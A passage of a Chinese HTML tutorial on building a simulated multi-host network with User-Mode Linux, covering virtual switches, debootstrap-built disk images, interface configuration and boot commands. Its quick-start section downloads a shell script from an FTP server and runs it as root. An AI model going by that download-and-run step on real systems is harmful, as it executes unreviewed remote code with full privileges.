>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-family: 宋体;"  >快速搭建</span></a></h1>  <p><span style="font-family: 宋体;"  >文件系统的制作有些繁琐</span><span lang="EN-US"  >,</span><span style="font-family: 宋体;"  >因此可以直接使用已经创建好的文凭系统和脚本进行测试</span><span lang="EN-US"  >.</span></p>  <h2><a name="_Toc277360848" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >2.1<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-family: 黑体;"  >准备工具和软件</span></a></h2>  <p><span lang="EN-US"  >sudo apt-get install uml_utilities user-mode-linux</span></p>  <p><span lang="EN-US"  >wget ftp://cbib.cnkk.org/incomming/hank-fs-AS</span></p>  <p><span lang="EN-US"  >wget ftp://cbib.cnkk.org/incomming/hank-fs-BS</span></p>  <p><span lang="EN-US"  >wget ftp://cbib.cnkk.org/incomming/hank-fs-A1</span></p>  <p><span lang="EN-US"  >wget ftp://cbib.cnkk.org/incomming/hank-fs-B1</span></p>  <p><span lang="EN-US"  >wget ftp://cbib.cnkk.org/incomming/hank-fs-B2</span></p>  <p><span lang="EN-US"  >wget ftp://cbib.cnkk.org/incomming/simnet.sh</span></p>  <p><span lang="EN-US"  >chmod +x simnet.sh</span></p>  <h2><a name="_Toc277360849" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >2.2<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-family: 黑体;"  >运行</span></a></h2>  <p><span lang="EN-US"  >sudo –i</span></p>  <p><span lang="EN-US"  >./simnet.sh</span></p>  <p><span style="font-family: 宋体;"  >现在网络已经启动</span><span lang="EN-US"  >,</span><span style="font-family: 宋体;"  >可以通过以下命令进入相应的模拟设备操作界面</span><span lang="EN-US"  >.</span><span style="font-family: 宋体;"  >从而进行第</span><span lang="EN-US"  >5</span><span style="font-family: 宋体;"  >节的测试</span><span lang="EN-US"  >.</span></p>  <table style="border-collapse: collapse; border: medium none;"  border="1"  cellpadding="0"  cellspacing="0"  >  <tbody><tr style=""  >   <td style="width: 185.4pt; border: 1pt solid windowtext; padding: 0cm 5.4pt;"  valign="top"  width="309"  >   <p><b style=""  ><span style="font-family: 宋体;"  >命令</span><span lang="EN-US"  ></span></b></p>   </td>   <td style="width: 240.7pt; border-width: 1pt 1pt 1pt medium; border-style: solid solid solid none; border-color: windowtext windowtext windowtext -moz-use-text-color; padding: 0cm 5.4pt;"  valign="top"  width="401"  >   <p><b style=""  ><span style="font-family: 宋体;"  >虚拟设备</span><span lang="EN-US"  ></span></b></p>   </td>  </tr>  <tr style=""  >   <td style="width: 185.4pt; border-width: medium 1pt 1pt; border-style: none solid solid; border-color: -moz-use-text-color windowtext windowtext; padding: 0cm 5.4pt;"  valign="top"  width="309"  >   <p><span lang="EN-US"  >screen –r sw1</span></p>   </td>   <td style="width: 240.7pt; border-width: medium 1pt 1pt medium; border-style: none solid solid none; border-color: -moz-use-text-color windowtext windowtext -moz-use-text-color; padding: 0cm 5.4pt;"  valign="top"  width="401"  >   <p><span lang="EN-US"  >Switch 1</span></p>   </td>  </tr>  <tr style=""  >   <td style="width: 185.4pt; border-width: medium 1pt 1pt; border-style: none solid solid; border-color: -moz-use-text-color windowtext windowtext; padding: 0cm 5.4pt;"  valign="top"  width="309"  >   <p><span lang="EN-US"  >screen –r swA</span></p>   </td>   <td style="width: 240.7pt; border-width: medium 1pt 1pt medium; border-style: none solid solid none; border-color: -moz-use-text-color windowtext windowtext -moz-use-text-color; padding: 0cm 5.4pt;"  valign="top"  width="401"  >   <p><span lang="EN-US"  >Switch A</span></p>   </td>  </tr>  <tr style=""  >   <td style="width: 185.4pt; border-width: medium 1pt 1pt; border-style: none solid solid; border-color: -moz-use-text-color windowtext windowtext; padding: 0cm 5.4pt;"  valign="top"  width="309"  >   <p><span lang="EN-US"  >screen –r swB</span></p>   </td>   <td style="width: 240.7pt; border-width: medium 1pt 1pt medium; border-style: none solid solid none; border-color: -moz-use-text-color windowtext windowtext -moz-use-text-color; padding: 0cm 5.4pt;"  valign="top"  width="401"  >   <p><span lang="EN-US"  >Switch B</span></p>   </td>  </tr>  <tr style=""  >   <td style="width: 185.4pt; border-width: medium 1pt 1pt; border-style: none solid solid; border-color: -moz-use-text-color windowtext windowtext; padding: 0cm 5.4pt;"  valign="top"  width="309"  >   <p><span lang="EN-US"  >screen –r vmAS</span></p>   </td>   <td style="width: 240.7pt; border-width: medium 1pt 1pt medium; border-style: none solid solid none; border-color: -moz-use-text-color windowtext windowtext -moz-use-text-color; padding: 0cm 5.4pt;"  valign="top"  width="401"  >   <p><span lang="EN-US"  >Server A</span></p>   </td>  </tr>  <tr style=""  >   <td style="width: 185.4pt; border-width: medium 1pt 1pt; border-style: none solid solid; border-color: -moz-use-text-color windowtext windowtext; padding: 0cm 5.4pt;"  valign="top"  width="309"  >   <p><span lang="EN-US"  >screen –r vmBS</span></p>   </td>   <td style="width: 240.7pt; border-width: medium 1pt 1pt medium; border-style: none solid solid none; border-color: -moz-use-text-color windowtext windowtext -moz-use-text-color; padding: 0cm 5.4pt;"  valign="top"  width="401"  >   <p><span lang="EN-US"  >Server B</span></p>   </td>  </tr>  <tr style=""  >   <td style="width: 185.4pt; border-width: medium 1pt 1pt; border-style: none solid solid; border-color: -moz-use-text-color windowtext windowtext; padding: 0cm 5.4pt;"  valign="top"  width="309"  >   <p><span lang="EN-US"  >screen –r vmA1</span></p>   </td>   <td style="width: 240.7pt; border-width: medium 1pt 1pt medium; border-style: none solid solid none; border-color: -moz-use-text-color windowtext windowtext -moz-use-text-color; padding: 0cm 5.4pt;"  valign="top"  width="401"  >   <p><span lang="EN-US"  >Client A</span></p>   </td>  </tr>  <tr style=""  >   <td style="width: 185.4pt; border-width: medium 1pt 1pt; border-style: none solid solid; border-color: -moz-use-text-color windowtext windowtext; padding: 0cm 5.4pt;"  valign="top"  width="309"  >   <p><span lang="EN-US"  >screen –r vmB1</span></p>   </td>   <td style="width: 240.7pt; border-width: medium 1pt 1pt medium; border-style: none solid solid none; border-color: -moz-use-text-color windowtext windowtext -moz-use-text-color; padding: 0cm 5.4pt;"  valign="top"  width="401"  >   <p><span lang="EN-US"  >Client B1</span></p>   </td>  </tr>  <tr style=""  >   <td style="width: 185.4pt; border-width: medium 1pt 1pt; border-style: none solid solid; border-color: -moz-use-text-color windowtext windowtext; padding: 0cm 5.4pt;"  valign="top"  width="309"  >   <p><span lang="EN-US"  >screen –r vmB2</span></p>   </td>   <td style="width: 240.7pt; border-width: medium 1pt 1pt medium; border-style: none solid solid none; border-color: -moz-use-text-color windowtext windowtext -moz-use-text-color; padding: 0cm 5.4pt;"  valign="top"  width="401"  >   <p><span lang="EN-US"  >Client B2</span></p>   </td>  </tr> </table>  <p><span lang="EN-US"  >&nbsp;</span></p>  </div>  <span style="font-size: 10.5pt; font-family: &quot;Times New Roman&quot;;"  lang="EN-US"  ><br style="page-break-before: always;"  clear="all"  > </span>  <div style=""  >  <h1><a name="_Toc277360850" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >3<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-family: 宋体;"  >准备工作</span></a></h1>  <h2><a name="_Toc277360851" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >3.1<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-family: 黑体;"  >预备知识</span></a></h2>  <h3><a name="_Toc277360852" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >3.1.1<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp; </span></span></span><span lang="EN-US"  >user-mode-linux</span></a></h3>  <p style="text-indent: 21pt;"  ><span lang="EN-US"  >User-mode-linux (UML) </span><span style="font-family: 宋体;"  >是让一个</span><span lang="EN-US"  >Linux</span><span style="font-family: 宋体;"  >作为一个独立进程运行在另一个</span><span lang="EN-US"  >linux</span><span style="font-family: 宋体;"  >上。</span></p>  <p style="text-indent: 21pt;"  ><span lang="EN-US"  >UML </span><span style="font-family: 宋体;"  >是一种在同一时间运行多</span><span lang="EN-US"  >Linux </span><span style="font-family: 宋体;"  >的安全方式。每个进程都是独立去其他的，这非常安全，例如在同一机器上进行多种测试和研发而不互相干扰。如果一些测试进程损坏并不会影响宿主系统或研发用进程。</span></p>  <h3><a name="_Toc277360853" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >3.1.2<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp; </span></span></span><span lang="EN-US"  >uml_net</span></a></h3>  <p style="text-indent: 21pt;"  ><span lang="EN-US"  >User Mode Linux</span><span style="font-family: 宋体;"  >连接网络有三种方式</span><span lang="EN-US"  >,</span><span style="font-family: 宋体;"  >分别是</span><span lang="EN-US"  >slirp, tuntap</span><span style="font-family: 宋体;"  >和</span><span lang="EN-US"  >uml_switch.</span></p>  <p style="text-indent: 21pt;"  ><span lang="EN-US"  >slirp</span><span style="font-family: 宋体;"  >方式最简单</span><span lang="EN-US"  >, </span><span style="font-family: 宋体;"  >只要安装</span><span lang="EN-US"  >slirp</span><span style="font-family: 宋体;"  >软件</span><span lang="EN-US"  >,</span><span style="font-family: 宋体;"  >在启动时指定</span><span lang="EN-US"  >eth0=slirp,</span><span style="font-family: 宋体;"  >并将</span><span lang="EN-US"  >UML</span><span style="font-family: 宋体;"  >的</span><span lang="EN-US"  >ip</span><span style="font-family: 宋体;"  >设置为</span><span lang="EN-US"  >10.0.2</span><span lang="EN-US"  >.15</span><span style="font-family: 宋体;"  >即可</span><span lang="EN-US"  >, </span><span style="font-family: 宋体;"  >但是这个方法只支持</span><span lang="EN-US"  >TCP</span><span style="font-family: 宋体;"  >和</span><span lang="EN-US"  >UDP,</span><span style="font-family: 宋体;"  >不支持</span><span lang="EN-US"  >ICMP,</span><span style="font-family: 宋体;"  >因此</span><span lang="EN-US"  >ping</span><span style="font-family: 宋体;"  >不能主机</span><span lang="EN-US"  >.</span></p>  <p style="text-indent: 21pt;"  ><span lang="EN-US"  >tuntap</span><span style="font-family: 宋体;"  >方式稍微复杂一些</span><span lang="EN-US"  >, </span><span style="font-family: 宋体;"  >启动时指定</span><span lang="EN-US"  >eth0=tuntap,,,192.168.1.201, </span><span style="font-family: 宋体;"  >这样会在主机上安装一个</span><span lang="EN-US"  >IP</span><span style="font-family: 宋体;"  >为</span><span lang="EN-US"  >192.168.1.201</span><span style="font-family: 宋体;"  >的</span><span lang="EN-US"  >tap</span><span style="font-family: 宋体;"  >设备</span><span lang="EN-US"  >,UML</span><span style="font-family: 宋体;"  >中设置同一网段的</span><span lang="EN-US"  >IP</span><span style="font-family: 宋体;"  >即可</span><span lang="EN-US"  >.</span></p>  <p style="text-indent: 21pt;"  ><span lang="EN-US"  >uml_switch</span><span style="font-family: 宋体;"  >的方法最为强大</span><span lang="EN-US"  >, uml_switch</span><span style="font-family: 宋体;"  >命令会创建一个虚拟交换机</span><span lang="EN-US"  >,</span><span style="font-family: 宋体;"  >并在主机上安装一个</span><span lang="EN-US"  >tap</span><span style="font-family: 宋体;"  >设备</span><span lang="EN-US"  >, </span><span style="font-family: 宋体;"  >如</span><span lang="EN-US"  >uml_switch –tap tap1 –unix /tmp/switch1, </span><span style="font-family: 宋体;"  >将会生成</span><span lang="EN-US"  >tap1</span><span style="font-family: 宋体;"  >设备和虚拟交换机</span><span lang="EN-US"  >/tmp/switch1, UML</span><span style="font-family: 宋体;"  >只要指定</span><span lang="EN-US"  >eth0=daemon,,unix,/tmp/switch1</span><span style="font-family: 宋体;"  >即可连上指定的交换机</span><span lang="EN-US"  >.</span></p>  <h3><a name="_Toc277360854" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >3.1.3<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp; </span></span></span><span lang="EN-US"  >screen</span></a><span style=""  ><span style="font-family: 宋体;"  >命令</span></span></h3>  <p><span style="font-family: 宋体;"  >使用</span><span lang="EN-US"  >screen</span><span style="font-family: 宋体;"  >命令</span><span lang="EN-US"  >,</span><span style="font-family: 宋体;"  >可以在一个</span><span lang="EN-US"  >putty</span><span style="font-family: 宋体;"  >上完成所有这些操作</span><span lang="EN-US"  >,</span><span style="font-family: 宋体;"  >下面这个命令的意思是</span><span lang="EN-US"  >:</span></p>  <p><span style="font-family: 宋体;"  >在后台启动一个</span><span lang="EN-US"  >screen, </span><span style="font-family: 宋体;"  >名称为</span><span lang="EN-US"  >&lt;screenName&gt;, </span><span style="font-family: 宋体;"  >并在启动的</span><span lang="EN-US"  >screen</span><span style="font-family: 宋体;"  >上执行</span><span lang="EN-US"  >&lt;command&gt;</span><span style="font-family: 宋体;"  >命令</span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >screen –S &lt;screenName&gt; -d –m &lt;command&gt;</span></span></p>  <p><span style="font-family: 宋体;"  >例如</span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >screen –S vmA1 –d –m linux ubd0=hank-fs-A1 eth0=daemon,,unix,/tmp/switchA</span></span></p>  <h2><a name="_Toc277360855" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >3.2<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-family: 黑体;"  >安装软件</span></a></h2>  <p><span lang="EN-US"  >sudo apt-get install uml_utilities user-mode-linux iptables</span></p>  <h2><a name="_Toc277360856" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >3.3<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-family: 黑体;"  >制作文件系统</span></a></h2>  <p><span lang="EN-US"  >#</span><span style="font-family: 宋体;"  >以下命令都使用</span><span lang="EN-US"  >root</span><span style="font-family: 宋体;"  >帐户操作</span></p>  <p><span lang="EN-US"  >#1. </span><span style="font-family: 宋体;"  >创建映像文件，并格式文件系统</span></p>  <p><span lang="EN-US"  >dd if=/dev/zero of=hank-fs bs=1024K count=400</span></p>  <p><span lang="EN-US"  >mkfs.ext3 hank-fs</span></p>  <p><span lang="EN-US"  >#2.1 </span><span style="font-family: 宋体;"  >加载基本文件</span></p>  <p><span lang="EN-US"  >mount -o loop hank-fs /mnt</span></p>  <p><span lang="EN-US"  >debootstrap --arch=i386 intrepid /mnt http://debian.ustc.edu.cn/ubuntu</span></p>  <p><span lang="EN-US"  >#2.2. </span><span style="font-family: 宋体;"  >拷贝</span><span lang="EN-US"  >modules</span><span style="font-family: 宋体;"  >到文件系统</span></p>  <p><span lang="EN-US"  >cp -r /usr/lib/uml/modules/* /mnt/lib/modules/</span></p>  <p><span lang="EN-US"  >#3. </span><span style="font-family: 宋体;"  >定制网络</span> <span style="font-family: 宋体;"  >文件系统</span> <span style="font-family: 宋体;"  >终端</span> <span style="font-family: 宋体;"  >用户</span></p>  <p><span lang="EN-US"  >chroot /mnt</span></p>  <p><span lang="EN-US"  >#3.1 </span><span style="font-family: 宋体;"  >网络</span><span lang="EN-US"  > /etc/network/interface</span></p>  <p><span lang="EN-US"  >auto lo</span></p>  <p><span lang="EN-US"  >iface lo inet loopback</span></p>  <p><span lang="EN-US"  >auto eth0</span></p>  <p><span lang="EN-US"  >iface eth0 inet static</span></p>  <p><span lang="EN-US"  >address 192.168.1.2</span></p>  <p><span lang="EN-US"  >netmask 255.255.255.0</span></p>  <p><span lang="EN-US"  >gateway 192.168.1.1</span></p>  <p><span lang="EN-US"  >#3.2 </span><span style="font-family: 宋体;"  >文件</span><span lang="EN-US"  > /etc/fstab</span></p>  <p><span lang="EN-US"  >/dev/ubda<span style=""  >&nbsp; </span>/<span style=""  >&nbsp; </span>ext3 defaults 0 1</span></p>  <p><span lang="EN-US"  >proc<span style=""  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>/proc<span style=""  >&nbsp; </span>proc defaults 0 0</span></p>  <p><span lang="EN-US"  >#3.3 </span><span style="font-family: 宋体;"  >终端</span><span lang="EN-US"  > /etc/default/console-setup, </span><span style="font-family: 宋体;"  >注释掉这下面一句</span></p>  <p><span lang="EN-US"  >#ACTIVE_CONSOLE=tty[1-6]</span></p>  <p><span lang="EN-US"  >cd /etc/event.d/</span></p>  <p><span lang="EN-US"  >rm tty[2-6]</span></p>  <p><span lang="EN-US"  >mv tty1 tty0</span></p>  <p><span lang="EN-US"  >#/etc/event.d/tty0 </span><span style="font-family: 宋体;"  >的最后一行，将</span><span lang="EN-US"  >tty1</span><span style="font-family: 宋体;"  >改为</span><span lang="EN-US"  >tty0</span></p>  <p><span lang="EN-US"  >exec /sbin/getty 38400 tty0</span></p>  <p><span lang="EN-US"  >#3.4 </span><span style="font-family: 宋体;"  >创建用户，并加入</span><span lang="EN-US"  >sudoers</span></p>  <p><span lang="EN-US"  >adduser hankjin</span></p>  <p><span lang="EN-US"  >#</span><span style="font-family: 宋体;"  >修改</span><span lang="EN-US"  >/etc/sudoers</span></p>  <p><span lang="EN-US"  >root<span style=""  >&nbsp;&nbsp;&nbsp; </span>ALL=(ALL) ALL</span></p>  <p><span lang="EN-US"  >hankjin ALL=(ALL) ALL</span></p>  </div>  <b><span style="font-size: 14pt; line-height: 173%; font-family: &quot;Times New Roman&quot;;"  lang="EN-US"  ><br style="page-break-before: always;"  clear="all"  > </span></b>  <div style=""  >  <h1><a name="_Toc277360857" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >4<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-family: 宋体;"  >开始搭建</span></a></h1>  <p style="text-indent: 21pt;"  ><span style="font-family: 宋体;"  >首先使用</span><span lang="EN-US"  >uml_switch</span><span style="font-family: 宋体;"  >命令创建三个虚拟交换机</span><span lang="EN-US"  >, </span><span style="font-family: 宋体;"  >同时自动在</span><span lang="EN-US"  >host</span><span style="font-family: 宋体;"  >上生成有一个</span><span lang="EN-US"  >tap,</span><span style="font-family: 宋体;"  >然后启动五个</span><span lang="EN-US"  >User Mode Linux,</span><span style="font-family: 宋体;"  >同时连接到虚拟交换机上</span><span lang="EN-US"  >.</span></p>  <h2><a name="_Toc277360858" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >4.1<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-family: 黑体;"  >虚拟交换机</span></a></h2>  <p><span style="font-family: 宋体;"  >使用</span><span lang="EN-US"  >uml_switch</span><span style="font-family: 宋体;"  >命令虚拟三台交换机</span><span lang="EN-US"  >:switch1, switchA</span><span style="font-family: 宋体;"  >和</span><span lang="EN-US"  >switchB, </span><span style="font-family: 宋体;"  >其中</span><span lang="EN-US"  >:</span></p>  <p><span lang="EN-US"  >switch1</span><span style="font-family: 宋体;"  >的网络为</span><span lang="EN-US"  >10.0.0</span><span lang="EN-US"  >.0/24,</span><span style="font-family: 宋体;"  >启动方式为</span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >sudo uml_switch –tap tap1 –unix /tmp/switch1</span></span></p>  <p><span lang="EN-US"  >switchA</span><span style="font-family: 宋体;"  >的网络为</span><span lang="EN-US"  >192.168.11.0/24,</span><span style="font-family: 宋体;"  >启动方式为</span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >sudo uml_switch –tap tapA –unix /tmp/switchA</span></span></p>  <p><span lang="EN-US"  >switchB</span><span style="font-family: 宋体;"  >的网络为</span><span lang="EN-US"  >192.168.22.0/24,</span><span style="font-family: 宋体;"  >启动方式为</span><span lang="EN-US"  >:</span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >sudo uml_switch –tap tapB –unix /tmp/switchB</span></span></p>  <h2><a name="_Toc277360859" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >4.2<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-family: 黑体;"  >定制文件系统</span></a></h2>  <p><span lang="EN-US"  >User Mode Linux</span><span style="font-family: 宋体;"  >支持</span><span lang="EN-US"  >Copy On Write</span><span style="font-family: 宋体;"  >技术</span><span lang="EN-US"  >, </span><span style="font-family: 宋体;"  >可以</span><span lang="EN-US"  >xxx,</span><span style="font-family: 宋体;"  >但是这里为了简化环境</span><span lang="EN-US"  >,</span><span style="font-family: 宋体;"  >直接将上面制作的</span><span lang="EN-US"  >hank-fs</span><span style="font-family: 宋体;"  >拷贝一个复本即可</span><span lang="EN-US"  >, </span><span style="font-family: 宋体;"  >因此</span><span lang="EN-US"  >, </span><span style="font-family: 宋体;"  >对每个</span><span lang="EN-US"  >User Mode Linux,</span><span style="font-family: 宋体;"  >我们都先拷贝一个复本出来</span><span lang="EN-US"  >.</span></p>  <h3><a name="_Toc277360860" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >4.2.1<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp; </span></span></span><span lang="EN-US"  >serverA</span></a></h3>  <p style="text-indent: 21pt;"  ><span style="font-family: 宋体;"  >首先从</span><span lang="EN-US"  >hank-fs</span><span style="font-family: 宋体;"  >拷贝一个复本</span><span lang="EN-US"  > cp hank-fs hank-fs-AS</span></p>  <p style="text-indent: 21pt;"  ><span lang="EN-US"  >serverA</span><span style="font-family: 宋体;"  >有两个网卡</span><span lang="EN-US"  >,</span><span style="font-family: 宋体;"  >一个连接</span><span lang="EN-US"  >switch1(eth0),</span><span style="font-family: 宋体;"  >一个连接</span><span lang="EN-US"  >switchA(eth1),</span><span style="font-family: 宋体;"  >因此启动</span><span lang="EN-US"  >serverA</span><span style="font-family: 宋体;"  >的命令为</span></p>  <p><span lang="EN-US"  >linux ubd0=hank-fs-AS eth0=daemon,,unix,/tmp/switch1 eth1=daemon,,unix,/tmp/switchA</span></p>  <p><span lang="EN-US"  ><span style=""  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><span style="font-family: 宋体;"  >启动后设置</span><span lang="EN-US"  >serverA</span><span style="font-family: 宋体;"  >的网络</span><span lang="EN-US"  >, sudo vi /etc/network/interface:</span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >auto eth0</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >iface eth0 inet static</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  ><span style=""  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>address 10.0.0.10</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  ><span style=""  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>netmask 255.255.255.0</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  ><span style=""  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>gateway 10.0.0.1</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >auto eth1</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >iface eth1 inet static</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  ><span style=""  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>address 192.168.11.3</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  ><span style=""  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>netmask 255.255.255.0</span></span></p>  <h3><a name="_Toc277360861" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >4.2.2<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp; </span></span></span><span lang="EN-US"  >serverB</span></a></h3>  <p style="text-indent: 21pt;"  ><span style="font-family: 宋体;"  >首先从</span><span lang="EN-US"  >hank-fs</span><span style="font-family: 宋体;"  >拷贝一个复本</span><span lang="EN-US"  > cp hank-fs hank-fs-BS</span></p>  <p style="text-indent: 21pt;"  ><span lang="EN-US"  >serverB</span><span style="font-family: 宋体;"  >有两个网卡</span><span lang="EN-US"  >,</span><span style="font-family: 宋体;"  >一个连接</span><span lang="EN-US"  >switch1(eth0),</span><span style="font-family: 宋体;"  >一个连接</span><span lang="EN-US"  >switchA(eth1),</span><span style="font-family: 宋体;"  >因此启动</span><span lang="EN-US"  >serverB</span><span style="font-family: 宋体;"  >的命令为</span></p>  <p><span lang="EN-US"  >linux ubd0=hank-fs-BS eth0=daemon,,unix,/tmp/switch1 eth1=daemon,,unix,/tmp/switchB</span></p>  <p><span lang="EN-US"  ><span style=""  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><span style="font-family: 宋体;"  >启动后设置</span><span lang="EN-US"  >serverB</span><span style="font-family: 宋体;"  >的网络</span><span lang="EN-US"  >, sudo vi /etc/network/interface:</span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >auto eth0</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >iface eth0 inet static</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  ><span style=""  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>address 10.0.0.20</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  ><span style=""  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>netmask 255.255.255.0</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  ><span style=""  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>gateway 10.0.0.1</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >auto eth1</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >iface eth1 inet static</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  ><span style=""  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>address 192.168.22.1</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  ><span style=""  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>netmask 255.255.255.0</span></span></p>  <h3><a name="_Toc277360862" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >4.2.3<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp; </span></span></span><span lang="EN-US"  >clientA</span></a></h3>  <p style="text-indent: 21pt;"  ><span style="font-family: 宋体;"  >首先从</span><span lang="EN-US"  >hank-fs</span><span style="font-family: 宋体;"  >拷贝一个复本</span><span lang="EN-US"  > cp hank-fs hank-fs-A1</span></p>  <p style="text-indent: 21pt;"  ><span lang="EN-US"  >clientA</span><span style="font-family: 宋体;"  >有一个网卡</span><span lang="EN-US"  >,</span><span style="font-family: 宋体;"  >连接</span><span lang="EN-US"  >switchA(eth0),</span><span style="font-family: 宋体;"  >因此启动</span><span lang="EN-US"  >clientA</span><span style="font-family: 宋体;"  >的命令为</span></p>  <p><span lang="EN-US"  >linux ubd0=hank-fs-A1 eth0=daemon,,unix,/tmp/switchA</span></p>  <p><span lang="EN-US"  ><span style=""  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><span style="font-family: 宋体;"  >启动后设置</span><span lang="EN-US"  >clientA</span><span style="font-family: 宋体;"  >的网络</span><span lang="EN-US"  >, sudo vi /etc/network/interface:</span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >auto eth0</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >iface eth0 inet static</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  ><span style=""  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>address 192.168.11.5</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  ><span style=""  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>netmask 255.255.255.0</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  ><span style=""  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>gateway 192.168.11.3</span></span></p>  <h3><a name="_Toc277360863" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >4.2.4<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp; </span></span></span><span lang="EN-US"  >clientB1</span></a></h3>  <p style="text-indent: 21pt;"  ><span style="font-family: 宋体;"  >首先从</span><span lang="EN-US"  >hank-fs</span><span style="font-family: 宋体;"  >拷贝一个复本</span><span lang="EN-US"  > cp hank-fs hank-fs-B1</span></p>  <p style="text-indent: 21pt;"  ><span lang="EN-US"  >ClientB1</span><span style="font-family: 宋体;"  >有一个网卡</span><span lang="EN-US"  >,</span><span style="font-family: 宋体;"  >连接</span><span lang="EN-US"  >switchB(eth0),</span><span style="font-family: 宋体;"  >因此启动</span><span lang="EN-US"  >clientB1</span><span style="font-family: 宋体;"  >的命令为</span></p>  <p><span lang="EN-US"  >linux ubd0=hank-fs-B1 eth0=daemon,,unix,/tmp/switchB</span></p>  